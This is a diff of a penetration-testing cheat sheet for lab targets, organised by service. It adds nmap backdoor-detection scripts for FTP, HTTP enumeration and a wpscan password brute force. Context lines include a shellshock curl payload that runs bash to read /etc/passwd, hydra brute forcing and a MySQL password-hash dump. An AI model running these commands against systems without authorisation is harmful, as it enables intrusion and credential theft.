@@ -94,6 +94,23 @@ TYPE i Set transfer to binary
 ftp bounce:
 nmap -vvvv -P0 -n -b 10.11.1.125A 10.11.1.125B -p-
 
+Ftp-proftpd-backdoor
+nmap --script ftp-proftpd-backdoor -p 21 <host>
+
+Ftp anonymous access
+nmap -sV -sC <target>
+
+Ftp proftpd-backdoor (ProFTPD 1.3.3c)
+nmap --script ftp-proftpd-backdoor -p 21 <host>
+
+Ftp-vsftpd-backdoor (vsFTPD 2.3.4)
+nmap --script ftp-vsftpd-backdoor -p 21 <host>
+
+Ftp-vuln-cve2010-4221(ProFTPD server, version between 1.3.2rc3 and 1.3.3b)
+nmap --script ftp-vuln-cve2010-4221 -p 21 <host>
+
+Anonymous ftp dump
+nmap -v -p 21 --script=ftp-anon.nse $ip-254
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------HTTP
 
@@ -160,6 +177,9 @@ HEAD / HTTP/1.0
 get the title of the webapp runinng check <title> tags:
 curl http://$ip/
 
+check the headers:
+nmap --script=http-headers $ip
+
 take a look at the webapp with the debugger tool
 ctrl + shift + k
 
@@ -181,6 +201,9 @@ curl
 
 directory brute force with no recursive checks:
 dirb http://$ip/ -r 
+
+nmap scan for directories:
+nmap --script http-enum $ip
   
 grab all source code:
 curl -i http://$ip/
@@ -215,10 +238,8 @@ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/passwords.txt $
 shellshock exploit:
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-WordPress
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+WORDPRESS
 
 enumerate Wordpress users
 wpscan --url http://10.10.10.2 --enumerate u
@@ -237,9 +258,10 @@ wpscan --url http://10.11.1.234/wp-login --usernames Core,Backup,admin --passwor
 
 wpscan --url http://10.141.1.251/wp --enumerate vp,u,vt --plugins-detection aggressive
 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+wpscan --url http://192.168.169.131/wp-login.php --passwords /root/vulnhub/robot/fsocity.dic --usernames elliot
 
-Drupal 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+DRUPAL
 
 to enumerate drupal use droopescan:
 ./droopescan --help
@@ -251,7 +273,6 @@ http://10.10.10.9/CHANGELOG.txt
 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
 NFS
 
 scanning nfs with nmap:
@@ -286,7 +307,6 @@ See root squashing
 https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
 SMB
 
 smb vuln scan:
@@ -405,7 +425,6 @@ With smbclient mget* downloads every file
 Smbmap -d active.htb -u svc_tgs -p password -H 10.10.10.100 - this command will log in with the username and password specified 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
 SMTP
 
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
@@ -450,7 +469,6 @@ nmap --script smtp-enum-users.nse 10.10.10.7
 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
 SNMP 
 
 first things first is get the community strings
@@ -497,8 +515,7 @@ SNMPv3 Enumeration
 nmap -sV -p 161 --script=snmp-info $ip/24
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
-Mysql
+MYSQL
 
 we can access a remote mysql database with this command:
 mysql -h 192.154.94.3 -u root -ppassword
@@ -575,7 +592,6 @@ SELECT User,Host,authentication_string FROM mysql.user;
 mysql -u root --password=<PASSWORD> -e "SELECT User,Host,authentication_string FROM mysql.user;"
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
-
 SSH 
 
 banner grabbing:
@@ -593,65 +609,7 @@ known_hosts
 id_rsa
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-									
 RPC
 
 port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. 
 When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-
-
-
-
-
-
-
-
-
